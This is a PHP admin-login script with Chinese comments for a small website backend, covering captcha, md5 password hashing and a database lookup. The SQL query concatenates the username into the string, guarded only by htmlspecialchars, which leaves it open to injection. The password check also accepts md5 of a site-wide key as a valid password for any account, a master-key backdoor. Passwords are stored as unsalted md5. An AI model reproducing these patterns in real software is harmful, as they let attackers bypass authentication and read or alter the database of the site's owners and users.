<?php 
/**
 * 定义后台登陆逻辑
 * */

	require_once (WEBROOT.'Common/toolExt.php');
	require_once (WEBROOT.'include/db.class.php');
	require_once (WEBROOT.'appData/database.config.php');
	require_once (WEBROOT.'Common/Session.php');
	
	
 	$session=new Session(); 
     //检验是否成功登陆
	if ( $session->contain('admin'))
		redirect("manage.php");
	
	$validate=$_POST['validate'];
	if (!empty($validate))
	{	
		
	  	$code = trim($_POST['code']);
    
		if ($code!=$_SESSION[check_auth]) {
	       	echo "<script>alert('验证码不正确');history.go(-1);</script>";
			die;
	    }
		
		$username=empty($_POST['username'])?'':$_POST['username'];
		$password=empty($_POST['password'])?'':$_POST['password'];
		if (empty($username)||empty($password)){
			 
			showMsg("用户名或密码为空！");
			 
		}
		else {
			$db = new DB($cfg_dbhost, $cfg_dbuser, $cfg_dbpwd, $cfg_dbname, $cfg_dbcharset, $cfg_dbprefix);
		 
			$username=htmlspecialchars($username);
			$password=htmlspecialchars($password);
			$password=md5($password);
			if (check($username,$password)){
				//showMsg("用户名！");
				redirect("manage.php");
				 
			}else {
				showMsg("用户名或密码错误！");
			 
			}
			 
		}
	}
	
	function check($username,$password){
		
		 global $db,$session,$SiteSiteKey;		
		 $sql="select * from ".$GLOBALS[cfg_dbprefix]."managermentuser where UserName='".$username."' ";
		 
		// echo $sql."<br/><br/>";				 
		 $info= $db->getRow($sql);
		 if($info){
			 if ($info['Password']==$password || md5($SiteSiteKey)==$password){		  
			 	$session->set("admin", $info['UserName']); 		 
			 	return true;
			 }
		 }else {
		 	return false;
		 }
	}
?>